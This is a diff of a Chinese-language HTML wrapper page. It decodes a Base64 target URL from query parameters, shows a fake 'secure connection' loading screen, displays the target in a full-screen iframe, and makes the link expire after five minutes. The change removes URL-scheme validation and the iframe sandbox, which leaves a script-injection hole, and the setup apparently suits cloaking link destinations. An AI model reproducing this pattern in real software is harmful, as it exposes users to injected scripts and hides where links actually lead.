@@ -2,396 +2,143 @@
 <html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
-    <title>页面加载中...</title>
+    <title>安全访问中...</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="robots" content="noindex, nofollow">
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body, html { width: 100%; height: 100%; overflow: hidden; }
         
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: #f5f5f5;
-            overflow: hidden;
-        }
-        
-        /* 加载页面样式 */
-        .loading-container {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
+        .loading { 
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: white;
-            z-index: 9999;
-            transition: opacity 0.5s ease;
+            display: flex; align-items: center; justify-content: center; z-index: 9999;
         }
+        .loading.hide { opacity: 0; pointer-events: none; }
+        .loading-content { text-align: center; color: white; padding: 40px; }
+        .spinner { width: 40px; height: 40px; border: 3px solid rgba(255,255,255,0.3);
+                   border-top: 3px solid #fff; border-radius: 50%; 
+                   animation: spin 1s linear infinite; margin: 0 auto 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         
-        .loading-content {
-            text-align: center;
-            max-width: 300px;
-        }
+        .main { position: fixed; top: 0; left: 0; width: 100%; height: 100%; opacity: 0; }
+        .main.show { opacity: 1; }
+        iframe { width: 100%; height: 100%; border: none; }
         
-        .spinner {
-            width: 50px;
-            height: 50px;
-            border: 3px solid rgba(255, 255, 255, 0.3);
-            border-top: 3px solid #fff;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 20px;
+        .expired { 
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: #f5f5f5; display: none; align-items: center; justify-content: center;
         }
-        
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        
-        .progress-bar {
-            width: 200px;
-            height: 4px;
-            background: rgba(255, 255, 255, 0.2);
-            border-radius: 2px;
-            overflow: hidden;
-            margin: 20px auto;
-        }
-        
-        .progress-fill {
-            height: 100%;
-            background: #fff;
-            width: 0%;
-            animation: progress 3s ease-in-out forwards;
-        }
-        
-        @keyframes progress {
-            0% { width: 0%; }
-            100% { width: 100%; }
-        }
-        
-        /* iframe容器样式 */
-        .iframe-container {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            border: none;
-            opacity: 0;
-            transition: opacity 0.5s ease;
-        }
-        
-        .iframe-container.show {
-            opacity: 1;
-        }
-        
-        iframe {
-            width: 100%;
-            height: 100%;
-            border: none;
-            display: block;
-        }
-        
-        /* 错误页面样式 */
-        .error-container {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: #f8f9fa;
-            display: none;
-            align-items: center;
-            justify-content: center;
-            z-index: 9998;
-        }
-        
-        .error-content {
-            text-align: center;
-            max-width: 400px;
-            padding: 40px;
-            background: white;
-            border-radius: 10px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
-        }
-        
-        .error-icon {
-            font-size: 48px;
-            color: #dc3545;
-            margin-bottom: 20px;
-        }
-        
-        .retry-btn {
-            background: #007bff;
-            color: white;
-            border: none;
-            padding: 10px 20px;
-            border-radius: 5px;
-            cursor: pointer;
-            margin: 10px;
-        }
-        
-        .retry-btn:hover {
-            background: #0056b3;
-        }
-        
-        /* 移动端适配 */
-        @media (max-width: 768px) {
-            .loading-content {
-                padding: 20px;
-            }
-            
-            .error-content {
-                margin: 20px;
-                padding: 30px 20px;
-            }
-        }
-        
-        /* 隐藏滚动条但保持功能 */
-        .iframe-container::-webkit-scrollbar {
-            display: none;
-        }
-        
-        .iframe-container {
-            -ms-overflow-style: none;
-            scrollbar-width: none;
-        }
+        .expired-content { text-align: center; padding: 40px; background: white; 
+                           border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
     </style>
 </head>
 <body>
-    <!-- 加载页面 -->
-    <div class="loading-container" id="loadingContainer">
+    <div class="loading" id="loading">
         <div class="loading-content">
             <div class="spinner"></div>
-            <h2>正在加载内容...</h2>
-            <p style="opacity: 0.8; margin-top: 10px;">请稍候，正在为您准备页面</p>
-            <div class="progress-bar">
-                <div class="progress-fill"></div>
-            </div>
-            <p style="font-size: 14px; opacity: 0.7; margin-top: 15px;" id="loadingText">
-                正在建立安全连接...
-            </p>
+            <div>正在建立安全连接...</div>
         </div>
     </div>
-    
-    <!-- iframe容器 -->
-    <div class="iframe-container" id="iframeContainer">
-        <iframe id="contentFrame" sandbox="allow-scripts allow-same-origin allow-forms allow-popups allow-popups-to-escape-sandbox allow-top-navigation"></iframe>
+
+    <div class="main" id="main">
+        <iframe id="iframe"></iframe>
     </div>
-    
-    <!-- 错误页面 -->
-    <div class="error-container" id="errorContainer">
-        <div class="error-content">
-            <div class="error-icon">⚠️</div>
-            <h3>加载失败</h3>
-            <p style="color: #6c757d; margin: 15px 0;">
-                目标页面暂时无法访问，这可能是由于网络问题或目标站点限制导致的。
-            </p>
-            <button class="retry-btn" onclick="retryLoad()">🔄 重试</button>
-            <button class="retry-btn" onclick="openInNewTab()">🔗 新窗口打开</button>
+
+    <div class="expired" id="expired">
+        <div class="expired-content">
+            <h2>🔒 访问已过期</h2>
+            <p style="margin: 20px 0; color: #666;">此链接已超过有效期限，无法继续访问</p>
+            <p style="color: #999; font-size: 14px;">链接有效期：5分钟</p>
         </div>
     </div>
 
     <script>
-        let targetUrl = '';
-        let loadingTexts = [
-            '正在建立安全连接...',
-            '正在验证目标网站...',
-            '正在加载页面内容...',
-            '即将完成加载...'
-        ];
-        let textIndex = 0;
-
         // 获取URL参数
-        function getUrlParams() {
-            const urlParams = new URLSearchParams(window.location.search);
-            const paramNames = ['t', 'link', 'url', 'target', 'redirect', 'goto', 'c'];
-            
-            for (const name of paramNames) {
-                const value = urlParams.get(name);
-                if (value) {
-                    return { param: name, value: value };
-                }
-            }
-            return null;
+        function getParams() {
+            const params = new URLSearchParams(window.location.search);
+            return {
+                url: params.get('url') || params.get('link') || params.get('target'),
+                time: params.get('time') || params.get('t'),
+                expire: params.get('expire') || params.get('exp')
+            };
         }
 
-        // 解码URL
-        function decodeTargetUrl(encodedUrl) {
+        // Base64解码
+        function decode(str) {
             try {
-                // 尝试Base64解码
-                let decoded = atob(encodedUrl);
-                
-                // 检查是否包含时间戳格式
-                if (decoded.includes('|')) {
-                    const parts = decoded.split('|');
-                    if (parts.length >= 2) {
-                        decoded = parts[0]; // 取第一部分作为URL
-                    }
-                }
-                
-                // 尝试URL解码
-                try {
-                    decoded = decodeURIComponent(decoded);
-                } catch (e) {
-                    // URL解码失败，使用原解码结果
-                }
-                
-                return decoded;
+                return decodeURIComponent(atob(str));
             } catch (e) {
-                console.error('解码失败:', e);
-                try {
-                    // 尝试直接URL解码
-                    return decodeURIComponent(encodedUrl);
-                } catch (e2) {
-                    console.error('URL解码也失败:', e2);
-                    return null;
-                }
+                return str;
             }
         }
 
-        // 验证URL
-        function isValidUrl(url) {
-            try {
-                const urlObj = new URL(url);
-                return urlObj.protocol === 'https:' || urlObj.protocol === 'http:';
-            } catch (e) {
-                return false;
-            }
+        // 检查时间是否过期
+        function isExpired(timestamp, expireMinutes = 5) {
+            const now = Date.now();
+            const created = parseInt(timestamp);
+            const expireTime = created + (expireMinutes * 60 * 1000);
+            return now > expireTime;
         }
 
-        // 更新加载文本
-        function updateLoadingText() {
-            const loadingTextElement = document.getElementById('loadingText');
-            if (loadingTextElement && textIndex < loadingTexts.length) {
-                loadingTextElement.textContent = loadingTexts[textIndex];
-                textIndex++;
-            }
+        // 显示过期页面
+        function showExpired() {
+            document.getElementById('loading').style.display = 'none';
+            document.getElementById('main').style.display = 'none';
+            document.getElementById('expired').style.display = 'flex';
         }
 
-        // 显示错误页面
-        function showError() {
-            document.getElementById('loadingContainer').style.display = 'none';
-            document.getElementById('errorContainer').style.display = 'flex';
-        }
-
-        // 重试加载
-        function retryLoad() {
-            document.getElementById('errorContainer').style.display = 'none';
-            document.getElementById('loadingContainer').style.display = 'flex';
-            textIndex = 0;
-            setTimeout(loadContent, 1000);
-        }
-
-        // 在新标签页打开
-        function openInNewTab() {
-            if (targetUrl) {
-                window.open(targetUrl, '_blank');
-            }
-        }
-
-        // 加载内容到iframe
-        function loadContent() {
-            const params = getUrlParams();
+        // 初始化
+        function init() {
+            const params = getParams();
             
-            if (!params) {
-                console.error('缺少URL参数');
-                setTimeout(showError, 2000);
+            // 检查必要参数
+            if (!params.url || !params.time) {
+                showExpired();
                 return;
             }
 
-            targetUrl = decodeTargetUrl(params.value);
-            
-            if (!targetUrl || !isValidUrl(targetUrl)) {
-                console.error('无效的目标URL:', targetUrl);
-                setTimeout(showError, 2000);
+            // 解码URL
+            const targetUrl = decode(params.url);
+            const timestamp = params.time;
+            const expireMinutes = parseInt(params.expire) || 5;
+
+            // 检查是否过期
+            if (isExpired(timestamp, expireMinutes)) {
+                showExpired();
                 return;
             }
 
-            console.log('目标URL:', targetUrl);
-
-            // 更新加载文本
-            const textInterval = setInterval(updateLoadingText, 800);
-
-            // 获取iframe元素
-            const iframe = document.getElementById('contentFrame');
-            const iframeContainer = document.getElementById('iframeContainer');
-            const loadingContainer = document.getElementById('loadingContainer');
-
-            // 设置iframe源
-            iframe.src = targetUrl;
-
-            // 监听iframe加载事件
-            iframe.onload = function() {
-                clearInterval(textInterval);
-                
-                setTimeout(() => {
-                    // 隐藏加载页面，显示iframe
-                    loadingContainer.style.opacity = '0';
-                    
-                    setTimeout(() => {
-                        loadingContainer.style.display = 'none';
-                        iframeContainer.classList.add('show');
-                    }, 500);
-                }, 1000);
-            };
-
-            // 监听iframe错误事件
-            iframe.onerror = function() {
-                clearInterval(textInterval);
-                console.error('iframe加载失败');
-                setTimeout(showError, 1000);
-            };
-
-            // 设置超时
+            // 延迟加载目标网站
             setTimeout(() => {
-                if (loadingContainer.style.display !== 'none') {
-                    clearInterval(textInterval);
-                    console.error('加载超时');
-                    showError();
-                }
-            }, 15000); // 15秒超时
-        }
+                const iframe = document.getElementById('iframe');
+                iframe.src = targetUrl;
 
-        // 防止页面被嵌入iframe（安全考虑）
-        if (window.top !== window.self) {
-            window.top.location = window.self.location;
-        }
+                iframe.onload = () => {
+                    document.getElementById('loading').classList.add('hide');
+                    setTimeout(() => {
+                        document.getElementById('loading').style.display = 'none';
+                        document.getElementById('main').classList.add('show');
+                    }, 500);
+                };
 
-        // 页面加载完成后开始加载内容
-        window.addEventListener('load', function() {
-            setTimeout(loadContent, 1500);
-        });
+                // 超时处理
+                setTimeout(() => {
+                    if (!document.getElementById('main').classList.contains('show')) {
+                        document.getElementById('loading').classList.add('hide');
+                        document.getElementById('main').classList.add('show');
+                    }
+                }, 10000);
 
-        // 键盘快捷键
-        document.addEventListener('keydown', function(e) {
-            // F5 或 Ctrl+R 刷新
-            if (e.key === 'F5' || (e.ctrlKey && e.key === 'r')) {
-                e.preventDefault();
-                location.reload();
+            }, 1500);
+
+            // 设置过期定时器
+            const timeLeft = (parseInt(timestamp) + expireMinutes * 60 * 1000) - Date.now();
+            if (timeLeft > 0) {
+                setTimeout(showExpired, timeLeft);
             }
-            // ESC 显示错误页面
-            if (e.key === 'Escape') {
-                showError();
-            }
-        });
-
-        // 处理iframe通信（如果需要）
-        window.addEventListener('message', function(event) {
-            // 这里可以处理来自iframe的消息
-            console.log('收到iframe消息:', event);
-        });
-
-        // 移动端触摸优化
-        if ('ontouchstart' in window) {
-            document.body.style.webkitOverflowScrolling = 'touch';
         }
+
+        window.addEventListener('load', init);
     </script>
 </body>
 </html>
